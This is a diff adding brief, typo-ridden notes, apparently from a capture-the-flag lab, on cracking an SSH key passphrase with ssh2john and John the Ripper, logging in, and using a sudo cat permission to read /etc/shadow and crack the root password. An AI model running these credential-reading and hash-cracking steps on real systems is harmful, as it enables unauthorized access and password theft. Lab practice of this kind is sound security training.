@@ -1,0 +1,25 @@
+brute it
+
+## chmod 6000 id_rsa
+
+## ssh2john.py id_rsa > id.txt
+# john id.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+### rockinroll
+
+# ssh -i id_rsa john@10.10.10.10
+yes
+rockinrol
+
+ls
+
+sudo -l  = > /bon/cat
+sudo /bin/cat /etc/shadow/ (copy root hash)
+sudo /bin/cat /etc/passwd (check )
+copy all shadow
+nano shadow.txt
+john shadow.txt
+ 
+# root
+su 
+football
+
